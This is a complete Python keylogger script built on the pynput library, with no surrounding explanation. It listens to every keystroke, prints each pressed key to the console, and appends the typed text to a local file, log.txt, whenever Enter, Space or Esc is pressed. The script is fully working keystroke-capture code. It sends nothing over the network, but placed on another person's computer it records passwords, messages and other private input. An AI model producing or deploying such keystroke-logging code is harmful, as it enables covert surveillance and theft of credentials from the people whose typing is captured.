import pynput 
from pynput.keyboard import Key, Listener

charCount = 0
keys = []
def onKeyPress(key):
    try: 
        print('Key Pressed : ',key)    #Print pressed key   
    except Exception as ex:
        print('There was an error : ',ex)

def onKeyRelease(key):
    global keys, charCount  #Access global variables
    if key == Key.esc:
        writeToFile()
        return False
    else:
        if key == Key.enter:    #Write keys to file
            writeToFile()
        elif key == Key.space:  #Write keys to file
            key = ' '
            writeToFile()
        keys.append(key)    #Store the Keys
        charCount += 1      #Count keys pressed

def writeToFile():
    global keys, charCount
    with open('log.txt','a') as file:
        for key in keys:
            key = str(key).replace("'","")   #Replace ' with space
            if 'key'.upper() not in key.upper():
                file.write(key)
        file.write("\n")    #Insert new line
    keys,charCount = [],0

with Listener(on_press=onKeyPress,\
    on_release=onKeyRelease) as listener:
    listener.join()
